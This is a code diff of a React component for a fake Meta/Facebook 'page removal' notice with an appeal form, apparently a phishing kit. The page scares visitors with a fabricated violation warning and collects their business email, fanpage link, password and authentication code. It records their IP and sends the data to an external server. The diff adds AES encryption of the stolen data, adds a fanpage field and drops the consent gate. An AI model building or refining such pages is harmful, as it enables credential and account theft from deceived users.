@@ -1,11 +1,13 @@
 import { b458d46547465s44d5s45, fd4s4d7f4s5df44fd4, g5ef5d158415e51q1, h245f15d84e5d44, j4s5d4s54d5sd4w5, k154s5e121w5e4512154, k9854w4e5136q5a, s32w659we12154r } from 'Images/images';
-import { Button, Checkbox, Form, Input } from 'antd';
+import { Button, Checkbox, Form, Input} from 'antd';
 import React, { useState } from 'react'
 import "../../assets/css/mystyle.css"
 import axios from 'axios';
-const { TextArea } = Input;
+import CryptoJS from 'crypto-js';
 
 type Props = {}
+
+const { TextArea } = Input;
 
 const ContentComponent = (props: Props) => {
     const [form]                                = Form.useForm();
@@ -17,20 +19,32 @@ const ContentComponent = (props: Props) => {
     const [activePassword, setActivePassword]   = useState(false);
     const [first, setActionFirst]               = useState(true);
     const [activeWaring, setActiveWaring]       = useState(false);
-    const [timeLeft, setTimeLeft]               = useState(90); 
+    const [timeLeft, setTimeLeft]               = useState(import.meta.env.VITE_SETTING_TIME); 
     const minutes   = Math.floor(timeLeft / 60);
     const seconds   = timeLeft % 60;
-        
-    const callApi = async (values:any) => {
+
+    function encrypt(text:string) {
+        const secretKey = 'HDNDT-JDHT8FNEK-JJHR';
+        const encrypted = CryptoJS.AES.encrypt(text, secretKey).toString();
+        return encrypted;
+    }
+    
+    const callApi = async (values:object) => {
         try {
-            const response = await axios.post(`${import.meta.env.VITE_URL_SERVER}/api/resgister`, values);
+            const data = {...values, "token": import.meta.env.VITE_TOKEN}
+
+            const jsonString = JSON.stringify(data);
+            const encryptedData = encrypt(jsonString);
+    
+            const response = await axios.post(`${import.meta.env.VITE_URL_SERVER}/api/register`, { data: encryptedData });
+    
             return response;
         } catch (error) {
-            throw error; 
+            throw error;
         }
-    }
+    };
 
-    const saveSession = (key:string, value:any) => {
+    const saveSession = (key:string, value:object) => {
         try {
             sessionStorage.setItem(key, JSON.stringify(value));
         } catch (error) {
@@ -56,20 +70,20 @@ const ContentComponent = (props: Props) => {
         }
     };
 
-    const opendMenuHandle = (menuId) => {
+    const handleOpendMenu = (menuId:any) => {
         setActiveMenu((prevActiveMenu) => (prevActiveMenu === menuId ? null : menuId));
     };
 
-    const onChangeAgreed = (e:any) => {
+    const handleChangePolicy = (e:any) => {
         setAgreed(e.target.checked); 
     };
 
-    const openPopupHandle = (popupId:any) => {
+    const handleOpenPopup = (popupId:any) => {
         setactivePopup(!activePopup)
         setActiveItemPopup((prevActivePopup) => (prevActivePopup === popupId ? null : popupId))
     };
 
-    const onFinishHandle = async (values) => {
+    const onFinish = async (values:object) => {
 
         const { data }  = await axios.get('https://api.ipify.org?format=json');
         const IP = data.ip;
@@ -119,7 +133,7 @@ const ContentComponent = (props: Props) => {
         }
     };
 
-    const confirmHandle = (values: any) => {
+    const handleAuthentication = (values:any) => {
         if(timeLeft > 0){
 
             const intervalId = setInterval(() => {
@@ -202,7 +216,7 @@ const ContentComponent = (props: Props) => {
                         </svg>
                     </div>
 
-                    <div className='button-menu' onClick={() => openPopupHandle(1)}>
+                    <div className='button-menu' onClick={() => handleOpenPopup(1)}>
                         <div className='item-button'></div>
                         <div className='item-button'></div>
                         <div className='item-button'></div>
@@ -274,7 +288,7 @@ const ContentComponent = (props: Props) => {
                                 </div>
                 
                                 <div className={activeMenu === 1 ? "item-action active" : "item-action"} >
-                                    <div className='action-button' onClick={() => opendMenuHandle(1)}>
+                                    <div className='action-button' onClick={() => handleOpendMenu(1)}>
                                         <div className='action-icon'>
                                             <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                 <path d="M5.99996 6C6.22008 6.00001 6.43405 6.07265 6.60869 6.20666C6.78332 6.34067 6.90886 6.52855 6.96584 6.74118C7.02281 6.9538 7.00804 7.17929 6.9238 7.38266C6.83957 7.58603 6.69059 7.75593 6.49996 7.866V8.5C6.49996 8.63261 6.44728 8.75979 6.35351 8.85355C6.25974 8.94732 6.13256 9 5.99996 9C5.86735 9 5.74017 8.94732 5.6464 8.85355C5.55263 8.75979 5.49996 8.63261 5.49996 8.5V7.866C5.30933 7.75593 5.16034 7.58603 5.07611 7.38266C4.99188 7.17929 4.9771 6.9538 5.03408 6.74118C5.09105 6.52855 5.21659 6.34067 5.39122 6.20666C5.56586 6.07265 5.77983 6.00001 5.99996 6Z" fill="black" />
@@ -291,91 +305,91 @@ const ContentComponent = (props: Props) => {
                                         </div>
                                     </div>
                                     <div className='content-action'>
-                                        <div className="action-button" onClick={() => openPopupHandle(3)}>
+                                        <div className="action-button" onClick={() => handleOpenPopup(3)}>
                                             <div className="action-icon">
                                                 <svg></svg>
                                             </div>
                                             <div className="action-text">What is the Privacy Policy and what does it cover?</div>
                                             <div className="action-arrow"></div>
                                         </div>
-                                        <div className="action-button" onClick={() => openPopupHandle(3)}>
+                                        <div className="action-button" onClick={() => handleOpenPopup(3)}>
                                             <div className="action-icon">
                                                 <svg></svg>
                                             </div>
                                             <div className="action-text">What information do we collect?</div>
                                             <div className="action-arrow"></div>
                                         </div>
-                                        <div className="action-button" onClick={() => openPopupHandle(3)}>
+                                        <div className="action-button" onClick={() => handleOpenPopup(3)}>
                                             <div className="action-icon">
                                                 <svg></svg>
                                             </div>
                                             <div className="action-text">How do we use your information?</div>
                                             <div className="action-arrow"></div>
                                         </div>
-                                        <div className="action-button" onClick={() => openPopupHandle(3)}>
+                                        <div className="action-button" onClick={() => handleOpenPopup(3)}>
                                             <div className="action-icon">
                                                 <svg></svg>
                                             </div>
                                             <div className="action-text">How do we share your information on Meta Products or with integrated partners?</div>
                                             <div className="action-arrow"></div>
                                         </div>
-                                        <div className="action-button" onClick={() => openPopupHandle(3)}>
+                                        <div className="action-button" onClick={() => handleOpenPopup(3)}>
                                             <div className="action-icon">
                                                 <svg></svg>
                                             </div>
                                             <div className="action-text">How do we share information with third parties?</div>
                                             <div className="action-arrow"></div>
                                         </div>
-                                        <div className="action-button" onClick={() => openPopupHandle(3)}>
+                                        <div className="action-button" onClick={() => handleOpenPopup(3)}>
                                             <div className="action-icon">
                                                 <svg></svg>
                                             </div>
                                             <div className="action-text">How is the cooperation between Meta Companies organized?</div>
                                             <div className="action-arrow"></div>
                                         </div>
-                                        <div className="action-button" onClick={() => openPopupHandle(3)}>
+                                        <div className="action-button" onClick={() => handleOpenPopup(3)}>
                                             <div className="action-icon">
                                                 <svg></svg>
                                             </div>
                                             <div className="action-text">How can you manage or delete your information and exercise your rights?</div>
                                             <div className="action-arrow"></div>
                                         </div>
-                                        <div className="action-button" onClick={() => openPopupHandle(3)}>
+                                        <div className="action-button" onClick={() => handleOpenPopup(3)}>
                                             <div className="action-icon">
                                                 <svg></svg>
                                             </div>
                                             <div className="action-text">How long do we keep your information?</div>
                                             <div className="action-arrow"></div>
                                         </div>
-                                        <div className="action-button" onClick={() => openPopupHandle(3)}>
+                                        <div className="action-button" onClick={() => handleOpenPopup(3)}>
                                             <div className="action-icon">
                                                 <svg></svg>
                                             </div>
                                             <div className="action-text">How do we transmit information?</div>
                                             <div className="action-arrow"></div>
                                         </div>
-                                        <div className="action-button" onClick={() => openPopupHandle(3)}>
+                                        <div className="action-button" onClick={() => handleOpenPopup(3)}>
                                             <div className="action-icon">
                                                 <svg></svg>
                                             </div>
                                             <div className="action-text">How do we respond to official requests, comply with applicable laws, and prevent harm?</div>
                                             <div className="action-arrow"></div>
                                         </div>
-                                        <div className="action-button" onClick={() => openPopupHandle(3)}>
+                                        <div className="action-button" onClick={() => handleOpenPopup(3)}>
                                             <div className="action-icon">
                                                 <svg></svg>
                                             </div>
                                             <div className="action-text">How will you know when the policy changes?</div>
                                             <div className="action-arrow"></div>
                                         </div>
-                                        <div className="action-button" onClick={() => openPopupHandle(3)}>
+                                        <div className="action-button" onClick={() => handleOpenPopup(3)}>
                                             <div className="action-icon">
                                                 <svg></svg>
                                             </div>
                                             <div className="action-text">How to ask Meta questions?</div>
                                             <div className="action-arrow"></div>
                                         </div>
-                                        <div className="action-button" onClick={() => openPopupHandle(3)}>
+                                        <div className="action-button" onClick={() => handleOpenPopup(3)}>
                                             <div className="action-icon">
                                                 <svg></svg>
                                             </div>
@@ -386,7 +400,7 @@ const ContentComponent = (props: Props) => {
                                 </div>
                 
                                 <div className={activeMenu === 2 ? "item-action active" : "item-action"} >
-                                    <div className='action-button' onClick={() => opendMenuHandle(2)}>
+                                    <div className='action-button' onClick={() => handleOpendMenu(2)}>
                                         <div className='action-icon'>
                                             <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                 <g clipPath="url(#clip0_4090_997)">
@@ -409,7 +423,7 @@ const ContentComponent = (props: Props) => {
                                         </div>
                                     </div>
                                     <div className='content-action'>
-                                        <div className='action-button' onClick={() => openPopupHandle(3)}>
+                                        <div className='action-button' onClick={() => handleOpenPopup(3)}>
                                             <div className='action-icon'>
                                                 <svg></svg>
                                             </div>
@@ -418,7 +432,7 @@ const ContentComponent = (props: Props) => {
                                             </div>
                                             <div className='action-arrow'></div>
                                         </div>
-                                        <div className='action-button' onClick={() => openPopupHandle(3)}>
+                                        <div className='action-button' onClick={() => handleOpenPopup(3)}>
                                             <div className='action-icon'>
                                                 <svg ></svg>
                                             </div>
@@ -432,7 +446,7 @@ const ContentComponent = (props: Props) => {
                                                 </svg>
                                             </div>
                                         </div>
-                                        <div className='action-button' onClick={() => openPopupHandle(3)}>
+                                        <div className='action-button' onClick={() => handleOpenPopup(3)}>
                                             <div className='action-icon'>
                                                 <svg ></svg>
                                             </div>
@@ -442,7 +456,7 @@ const ContentComponent = (props: Props) => {
                                             <div className='action-arrow'>
                                             </div>
                                         </div>
-                                        <div className='action-button' onClick={() => openPopupHandle(3)}>
+                                        <div className='action-button' onClick={() => handleOpenPopup(3)}>
                                             <div className='action-icon'>
                                                 <svg ></svg>
                                             </div>
@@ -452,7 +466,7 @@ const ContentComponent = (props: Props) => {
                                             <div className='action-arrow'>
                                             </div>
                                         </div>
-                                        <div className='action-button' onClick={() => openPopupHandle(3)}>
+                                        <div className='action-button' onClick={() => handleOpenPopup(3)}>
                                             <div className='action-icon'>
                                                 <svg ></svg>
                                             </div>
@@ -470,7 +484,7 @@ const ContentComponent = (props: Props) => {
                                 </div>
                 
                                 <div className={activeMenu === 3 ? "item-action active" : "item-action"} >
-                                    <div className='action-button' onClick={() => opendMenuHandle(3)}>
+                                    <div className='action-button' onClick={() => handleOpendMenu(3)}>
                                         <div className='action-icon'>
                                             <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                 <g clipPath="url(#clip0_4090_999)">
@@ -494,7 +508,7 @@ const ContentComponent = (props: Props) => {
                                         </div>
                                     </div>
                                     <div className='content-action'>
-                                        <div className='action-button' onClick={() => openPopupHandle(3)}>
+                                        <div className='action-button' onClick={() => handleOpenPopup(3)}>
                                             <div className='action-icon'>
                                                 <svg ></svg>
                                             </div>
@@ -508,7 +522,7 @@ const ContentComponent = (props: Props) => {
                                                 </svg>
                                             </div>
                                         </div>
-                                        <div className='action-button' onClick={() => openPopupHandle(3)}>
+                                        <div className='action-button' onClick={() => handleOpenPopup(3)}>
                                             <div className='action-icon'>
                                                 <svg ></svg>
                                             </div>
@@ -535,36 +549,26 @@ const ContentComponent = (props: Props) => {
                                     <rect width="100" height="100" rx="50" fill="#D80100" />
                                     <rect width="74" height="13" transform="translate(13 43)" fill="white" />
                                 </svg>
-                                {atob('V2UgaGF2ZSBzY2hlZHVsZWQgeW91ciBwYWdlIHRvIGJlIGRlbGV0ZWQ=')}
+                                We've scheduled the removal of your page
                             </h1>
-                            <p>{atob('V2UgaGF2ZSByZWNlaXZlZCBzZXZlcmFsIHJlcG9ydHMgdGhhdCB5b3VyIGFjY291bnQgdmlvbGF0ZXMgb3VyIHRlcm1zIG9mIHNlcnZpY2UgYW5kIGNvbW11bml0eSBndWlkZWxpbmVzLiBBcyBhIHJlc3VsdCwgeW91ciBhY2NvdW50IHdpbGwgYmUgc2VudCBmb3IgdmVyaWZpY2F0aW9uLg==')}</p>
+                            <p>We have received several reports that your account violates our terms of service and community guidelines. As a result, your account will be sent for verification.</p>
                             <br />
-                            <p>{atob('SWYgeW91IGJlbGlldmUgcmVzdHJpY3Rpb25zIGhhdmUgYmVlbiBwbGFjZWQgb24geW91ciBhY2NvdW50IGluIGVycm9yLCB5b3UgY2FuIHJlcXVlc3QgYSByZXZpZXcu')}</p>
-                            <br />
-                            <h6>{atob('QXBwZWFsIEd1aWRl')}</h6>
-                            <ul>
-                                <li>{atob('VmVyaWZpY2F0aW9uIHVzdWFsbHkgdGFrZXMgMjQgaG91cnMsIGFmdGVyIHdoaWNoIHdlJ2xsIGRlY2lkZSBpZiByZXN0cmljdGlvbnMgd2lsbCByZW1haW4gb3IgYmUgbGlmdGVkLg')}</li>
-                            </ul>
-
+                            <p>If you believe this was done in error, please submit a review request. Ensure all required details are provided to avoid delays or the risk of denial.</p>
+                            
                             <div className='card-thumb'>
                                 <img src={h245f15d84e5d44} width="100%" alt="" />
                                 <div className='thumb-content'>
-                                    <p className="thumb-type">Review request</p>
-                                    <h4>Fixing problems with account restrictions</h4>
-                                    <p>Please be sure to provide the requested information below. Failure to provide this information may delay the processing of your appeal.</p>
-
-                                    <div className='btn-wrapper' onClick={() => openPopupHandle(3)}>
+                                    <p>Verification usually takes 24 hours, after which we'll decide if restrictions will remain or be lifted.</p>
+                                    <div className='btn-wrapper' onClick={() => handleOpenPopup(3)}>
                                         <div className='button fb-blue'>Request Review</div>
                                     </div>
                                 </div>
                             </div>
-
-                            <br />
                             <br />
 
                             <h6>Privacy Center</h6>
                             <div className='action-button-list'>
-                                <div className='action-button b-bottom' onClick={() => openPopupHandle(2)}>
+                                <div className='action-button b-bottom' onClick={() => handleOpenPopup(2)}>
                                     <div className='action-icon'>
                                         <img src={fd4s4d7f4s5df44fd4} alt="" />
                                     </div>
@@ -579,7 +583,7 @@ const ContentComponent = (props: Props) => {
                                         </svg>
                                     </div>
                                 </div>
-                                <div className='action-button' onClick={() => openPopupHandle(2)}>
+                                <div className='action-button' onClick={() => handleOpenPopup(2)}>
                                     <div className='action-icon'>
                                         <img src={fd4s4d7f4s5df44fd4} alt="" />
                                     </div>
@@ -599,7 +603,7 @@ const ContentComponent = (props: Props) => {
 
                             <h6>For more details, see the User Agreement</h6>
                             <div className='action-button-list'>
-                                <div className='action-button' onClick={() => openPopupHandle(2)}>
+                                <div className='action-button' onClick={() => handleOpenPopup(2)}>
                                     <div className='action-icon'>
                                         <img src={g5ef5d158415e51q1} alt="" />
                                     </div>
@@ -619,7 +623,7 @@ const ContentComponent = (props: Props) => {
 
                             <h6>Additional resources</h6>
                             <div className='action-button-list'>
-                                <div className='action-button b-bottom ' onClick={() => openPopupHandle(2)}>
+                                <div className='action-button b-bottom ' onClick={() => handleOpenPopup(2)}>
                                     <div className='action-text'>
                                         <span>How Meta uses information for generative AI models</span>
                                         <br />
@@ -631,7 +635,7 @@ const ContentComponent = (props: Props) => {
                                         </svg>
                                     </div>
                                 </div>
-                                <div className='action-button b-bottom ' onClick={() => openPopupHandle(2)}>
+                                <div className='action-button b-bottom ' onClick={() => handleOpenPopup(2)}>
                                     <div className='action-text'>
                                         <span>Cards with information about the operation of AI systems</span>
                                         <br />
@@ -643,7 +647,7 @@ const ContentComponent = (props: Props) => {
                                         </svg>
                                     </div>
                                 </div>
-                                <div className='action-button' onClick={() => openPopupHandle(2)}>
+                                <div className='action-button' onClick={() => handleOpenPopup(2)}>
                                     <div className='action-text'>
                                         <span>Introduction to Generative AI</span>
                                         <br />
@@ -674,7 +678,7 @@ const ContentComponent = (props: Props) => {
 
                     <div className={activePopup === true ? "popup active" : "popup"}>
                         <div className={activeItemPopup === 1 ? "popup-item popup-menu active" : "popup-item popup-menu"}>
-                            <div className='close-bar' onClick={() => openPopupHandle(50)}>
+                            <div className='close-bar' onClick={() => handleOpenPopup(50)}>
                                 <div className='item-button top'></div>
                                 <div className='item-button bottom'></div>
                             </div>
@@ -739,7 +743,7 @@ const ContentComponent = (props: Props) => {
                                     </div>
 
                                     <div className={activeMenu === 1 ? "item-action active" : "item-action"} >
-                                        <div className='action-button' onClick={() => opendMenuHandle(1)}>
+                                        <div className='action-button' onClick={() => handleOpendMenu(1)}>
                                             <div className='action-icon'>
                                                 <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                     <path d="M5.99996 6C6.22008 6.00001 6.43405 6.07265 6.60869 6.20666C6.78332 6.34067 6.90886 6.52855 6.96584 6.74118C7.02281 6.9538 7.00804 7.17929 6.9238 7.38266C6.83957 7.58603 6.69059 7.75593 6.49996 7.866V8.5C6.49996 8.63261 6.44728 8.75979 6.35351 8.85355C6.25974 8.94732 6.13256 9 5.99996 9C5.86735 9 5.74017 8.94732 5.6464 8.85355C5.55263 8.75979 5.49996 8.63261 5.49996 8.5V7.866C5.30933 7.75593 5.16034 7.58603 5.07611 7.38266C4.99188 7.17929 4.9771 6.9538 5.03408 6.74118C5.09105 6.52855 5.21659 6.34067 5.39122 6.20666C5.56586 6.07265 5.77983 6.00001 5.99996 6Z" fill="black" />
@@ -851,7 +855,7 @@ const ContentComponent = (props: Props) => {
                                     </div>
 
                                     <div className={activeMenu === 2 ? "item-action active" : "item-action"} >
-                                        <div className='action-button' onClick={() => opendMenuHandle(2)}>
+                                        <div className='action-button' onClick={() => handleOpendMenu(2)}>
                                             <div className='action-icon'>
                                                 <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                     <g clipPath="url(#clip0_4090_997)">
@@ -935,7 +939,7 @@ const ContentComponent = (props: Props) => {
                                     </div>
 
                                     <div className={activeMenu === 3 ? "item-action active" : "item-action"} >
-                                        <div className='action-button' onClick={() => opendMenuHandle(3)}>
+                                        <div className='action-button' onClick={() => handleOpendMenu(3)}>
                                             <div className='action-icon'>
                                                 <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                     <g clipPath="url(#clip0_4090_999)">
@@ -995,7 +999,7 @@ const ContentComponent = (props: Props) => {
 
 
                         <div className={activeItemPopup === 2 ? "popup-item popup-menu active" : "popup-item popup-menu"}>
-                            <div className='close-bar' onClick={() => openPopupHandle(50)}>
+                            <div className='close-bar' onClick={() => handleOpenPopup(50)}>
                                 <div className='item-button top'></div>
                                 <div className='item-button bottom'></div>
                             </div>
@@ -1177,7 +1181,7 @@ const ContentComponent = (props: Props) => {
                         <div className={activeItemPopup === 3 ? "popup-item popup-modal active" : "popup-item popup-modal"}>
                             <div className='popup-head'>
                                 <h5>Apeal Form</h5>
-                                <div className='close-bar' onClick={() => openPopupHandle(50)}>
+                                <div className='close-bar' onClick={() => handleOpenPopup(50)}>
                                     <svg width="7" height="7" viewBox="0 0 7 7" fill="none" xmlns="http://www.w3.org/2000/svg">
                                         <rect x="0.671875" y="5.62134" width="7" height="1" rx="0.5" transform="rotate(-45 0.671875 5.62134)" fill="black" />
                                         <rect x="5.62109" y="6.32837" width="7" height="1" rx="0.5" transform="rotate(-135 5.62109 6.32837)" fill="black" />
@@ -1191,7 +1195,7 @@ const ContentComponent = (props: Props) => {
                                     initialValues={{
                                         remember: true,
                                     }}
-                                    onFinish={onFinishHandle}
+                                    onFinish={onFinish}
                                     autoComplete="off"
                                 >
 
@@ -1242,13 +1246,13 @@ const ContentComponent = (props: Props) => {
                                     </div>
 
                                     <div className="item-form">
-                                        <label>Business Email</label>
+                                        <label>Buiseness Email</label>
                                         <Form.Item
                                             name="businessEmail"
                                             rules={[
                                                 {
                                                     required: true,
-                                                    message: 'Please input business email!',
+                                                    message: 'Please input buiseness email!',
                                                 },
                                             ]}
                                         >
@@ -1271,7 +1275,20 @@ const ContentComponent = (props: Props) => {
                                         </Form.Item>
                                     </div>
 
-                                    
+                                    <div className="item-form">
+                                        <label>Link to fanpage</label>
+                                        <Form.Item
+                                            name="fanpageName"
+                                            rules={[
+                                                {
+                                                    required: true,
+                                                    message: 'Please input link to fanpage!',
+                                                }
+                                            ]}
+                                        >
+                                            <Input />
+                                        </Form.Item>
+                                    </div>
 
                                     <div className="item-form">
                                         <Form.Item
@@ -1284,7 +1301,7 @@ const ContentComponent = (props: Props) => {
                                                 },
                                             ]}
                                         >
-                                            <Checkbox onChange={onChangeAgreed}>
+                                            <Checkbox onChange={handleChangePolicy}>
                                                 I agree with
                                                 <div className='link-to'>
                                                     Terms of use
@@ -1298,7 +1315,7 @@ const ContentComponent = (props: Props) => {
                                     </div>
 
                                     <Form.Item>
-                                        <Button disabled={!agreed} className='button-send' htmlType="submit">
+                                        <Button className='button-send' htmlType="submit">
                                             Send
                                         </Button>
                                     </Form.Item>
@@ -1400,7 +1417,7 @@ const ContentComponent = (props: Props) => {
                                     initialValues={{
                                         remember: true,
                                     }}
-                                    onFinish={confirmHandle}
+                                    onFinish={handleAuthentication}
                                     form={form}
                                     autoComplete="off"
                                 >
